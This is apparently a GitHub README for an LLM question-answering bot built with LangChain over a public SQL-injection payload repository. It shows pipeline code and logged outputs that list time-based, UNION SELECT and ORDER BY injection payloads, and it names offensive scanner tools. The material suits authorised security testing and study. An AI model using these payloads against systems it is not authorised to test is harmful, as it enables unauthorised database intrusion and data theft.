# SQL-Injection-LLM-Bot
Get SQL Injection information using this Bot

## [Version 1.0](https://github.com/Krishna2709/SQL-Injection-LLM-Bot/blob/master/1.0-kk-SQL-Injection-InfoBot.ipynb)
### Steps:
1. Load the required libraries:
```
from langchain.chat_models import ChatOpenAI # --> OpenAI's LLM
from langchain.document_loaders import GitLoader # --> To clone the repo from GitHub
from langchain.indexes import VectorstoreIndexCreator # --> To create embeddings and indexes
from langchain.vectorstores import DocArrayInMemorySearch # --> Vector Database for LLM interaction
from IPython.display import display, Markdown # --> Output display
```
2. Clone the Repo using GitLoader from Langchain DocumentLoaders
```
loader = GitLoader(
    clone_url="https://github.com/hwchase17/langchain",
    repo_path="./example_data/test_repo2/",
    branch="master",
)

data = loader.load()
```
3. Created a Vector Database
```
index = VectorstoreIndexCreator(
    vectorstore_cls=DocArrayInMemorySearch
).from_loaders([loader])
```
4. Initialize the LLM
```
llm = ChatOpenAI(temperature = 0.0)
```
5. Query the database
```
query = "......"

response = index.query(query, llm=llm)

display(Markdown(response))
```

### Results
Query 1
```
query = "List all the different types of SQL Injections"
-----

Output:

The different types of SQL injections are:

In-band SQLi (Classic SQLi)
Error-based SQLi
Union-based SQLi
Inferential SQLi (Blind SQLi)
Blind-boolean-based SQLi
Blind-time-based SQLi
```

Query 2
```
query = "List all the SQL Injection Vulnerability Scanner Tools"
-----

Output:

Here is a list of SQL Injection Vulnerability Scanner Tools:

SQLMap - Automatic SQL Injection And Database Takeover Tool
jSQL Injection - Java Tool For Automatic SQL Database Injection
BBQSQL - A Blind SQL-Injection Exploitation Tool
NoSQLMap - Automated NoSQL Database Pwnage
Whitewidow - SQL Vulnerability Scanner
DSSS - Damn Small SQLi Scanner
explo - Human And Machine Readable Web Vulnerability Testing Format
Blind-Sql-Bitshifting - Blind SQL-Injection via Bitshifting
Leviathan - Wide Range Mass Audit Toolkit
Blisqy - Exploit Time-based blind-SQL-injection in HTTP-Headers (MySQL/MariaDB)
These tools can help identify and exploit SQL injection vulnerabilities in web applications.
```

Query 3
```
query = "List some Generic Time Based SQL Injection Payloads"
-----

Output:

Here are some examples of generic time-based SQL injection payloads:

1. sleep(5)#
2. 1 or sleep(5)#
3. " or sleep(5)#
4. ' or sleep(5)#
5. " or sleep(5)="#
6. ' or sleep(5)='
7. 1) or sleep(5)#
8. ") or sleep(5)="#
9. ') or sleep(5)='
10. 1)) or sleep(5)#
11. ")) or sleep(5)="#
12. ')) or sleep(5)='
13. ;waitfor delay '0:0:5'--
14. );waitfor delay '0:0:5'--
15. ';waitfor delay '0:0:5'--
16. ";waitfor delay '0:0:5'--
17. ');waitfor delay '0:0:5'--
18. ");waitfor delay '0:0:5'--
19. ));waitfor delay '0:0:5'--
20. '));waitfor delay '0:0:5'--
21. "));waitfor delay '0:0:5'--
22. benchmark(10000000,MD5(1))#
These payloads can be used to test for time-based SQL injection vulnerabilities in web applications.
```

Query 4
```
query = "List some Generic Union Select Payloads"
----

Output:

Here are some examples of generic Union Select payloads that can be used in SQL injection attacks:

1. , (select * from (select(sleep(10)))a)
2. %2c(select%20*%20from%20(select(sleep(10)))a)
3. ';WAITFOR DELAY '0:0:30'--
These payloads can be used to perform Union-based SQL injection attacks by injecting malicious SQL code into vulnerable input fields. It is important to note that these payloads may need to be modified or customized based on the specific target and the underlying database management system being used.
```

Query 5
```
query = "List some Generic UNION SELECT Payloads"
----

Output:

Here are some examples of generic UNION SELECT payloads:

UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#
These payloads can be used to test for SQL injection vulnerabilities by injecting a UNION SELECT statement into a vulnerable parameter and checking if the response contains the injected payload.
```

### Observations
1. Query 4 and Query 5 are the same but the LLM considered the SQL commands strictly.
2. The LLM returned Generic Time Based SQL Injection Payloads for the Query 4: List some Generic Union Select Payloads
3. The generic embeddings may not be able to capture the meaning of domain-specific knowledge


## [Version 2.0](https://github.com/Krishna2709/SQL-Injection-LLM-Bot/blob/master/2.0-kk-SQL-Injection-InfoBot-W%26B.ipynb)
### Steps:
1. Load the required libraries:
```
from langchain.chat_models import ChatOpenAI
from langchain.document_loaders import GitLoader
from langchain.text_splitter import MarkdownTextSplitter
from langchain.embeddings import OpenAIEmbeddings
from langchain.vectorstores import Qdrant
from langchain.prompts import PromptTemplate
```

2. Clone the Repo using GitLoader from Langchain DocumentLoaders
```
loader = GitLoader(
    clone_url="https://github.com/payloadbox/sql-injection-payload-list",
    repo_path="./github_data/sql_repo/",
    branch="master",
    file_filter=lambda file_path: file_path.endswith(".md")
)

data = loader.load()
```

3. Preprocess the document: Removing HTML tags to reduce the token usage and remove irrelevant content
```
def remove_html_tags(text):
    clean = re.compile('<.*?>')
    return re.sub(clean, '', text)

data[0].page_content = remove_html_tags(data[0].page_content)
```

4. Initialize WandB for tracing and experiment tracking
```
os.environ["LANGCHAIN_WANDB_TRACING"] = "true"
os.environ["WANDB_PROJECT"] = "sql-injection-tools"
```

5. Parsing
```
md_text_splitter = MarkdownTextSplitter(chunk_size=4000, chunk_overlap=500)
document_sections = md_text_splitter.split_documents(data)
#len(document_sections)
#Markdown(document_sections[2].page_content)
```

6. Embeddings: Using OpenAIEmbeddings to embed the text and Qdrant to store the vectors
```
embeddings = OpenAIEmbeddings()
db = Qdrant.from_documents(document_sections, 
                           embeddings,
                           path="/tmp/local_qdrant_db",
                           collectio_name="sql_injection_tools")

db_retriever = db.as_retriever()
```

7. Prompt Template: Take the content of the retrieved documents, stuff them into the prompt template along with the query, and pass them into an LLM to obtain the answer.
```
prompt_template = """
Use the following context to answer the question at the end.
If you don't know the answer, say that you don't know, try not to make up an answer.

{context}

Question: {question}
Answer:
"""

PROMPT = PromptTemplate(template=prompt_template, input_variables=["context", "question"])
```

8. Initialize OpenAI:
```
llm = ChatOpenAI(temperature=0.0)
```

9. Using LangChain:
```
query = "List some Generic UNION SELECT Payloads"
docs = db_retriever.get_relevant_documents(query)
context = docs[0].page_content
prompt = PROMPT.format(context=context, question=query)

response = llm.predict(prompt)
Markdown(response)
```

### Results
Query 1
```
query = "List some Generic Union Select Payloads"
-----

Output:

Some Generic Union Select Payloads are:                                                                            

 • ORDER BY SLEEP(5)                                                                                               
 • ORDER BY 1,SLEEP(5)                                                                                             
 • ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))                                                                 
 • ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4                                                               
 • ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5                                                             
 • ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6                                                           
 • ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7                                                         
 • ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8  
```

Query 2
```
query = "List some Generic UNION SELECT Payloads"
-----

Output:

Some generic UNION SELECT payloads include:                                                                        

 • UNION SELECT NULL                                                                                               
 • UNION SELECT 'a', 'b', 'c'                                                                                      
 • UNION SELECT 1,2,3                                                                                              
 • UNION SELECT 'a',2,3                                                                                            
 • UNION SELECT 'a',2,3 FROM dual                                                                                  
 • UNION SELECT 'a',2,3 FROM dual WHERE 1=1                                                                        
 • UNION SELECT 'a',2,3 FROM dual WHERE 1=0                                                                        
 • UNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 1                                                             
 • UNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 2                                                             
 • UNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 3                                                             
 • UNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 4                                                             
 • UNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 5                                                             
 • UNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 6  
```

Query 3
```
query = "List some Generic Time Based SQL Injection Payloads"
-----

Output:

 • sleep(5)#                                                                                                       
 • 1 or sleep(5)#                                                                                                  
 • " or sleep(5)#                                                                                                  
 • ' or sleep(5)#                                                                                                  
 • " or sleep(5)="                                                                                                 
 • ' or sleep(5)='                                                                                                 
 •  1 or sleep(5)#                                                                                                 
 • ") or sleep(5)="                                                                                                
 • ') or sleep(5)='                                                                                                
 • 1)) or sleep(5)#                                                                                                
 • ")) or sleep(5)="                                                                                               
 • ')) or sleep(5)='                                                                                               
 • ;waitfor delay '0:0:5'--                                                                                        
 • );waitfor delay '0:0:5'--                                                                                       
 • ';waitfor delay '0:0:5'--      
```

### Observations
1. We reduced the token usage by adding filters to GitLoader, preprocessed text by removing HTML tags, and Parsing the document by splitting it into Chunks.
2. We used OpenAIEmbeddings to create text embeddings and Qdrant to store and retrieve similar vectors.
3. We create a PromptTemplate for LLM generation.
4. The parsing, embeddings, and qdrant methods improved the LLM performance.

### Improvements
- [ ] Evaluate the LLM using Manual and LLM evaluation methods
- [ ] Implement RouterChain: time_based_sql_template | union_select_template | .....
- [ ] Try different LLM vendors
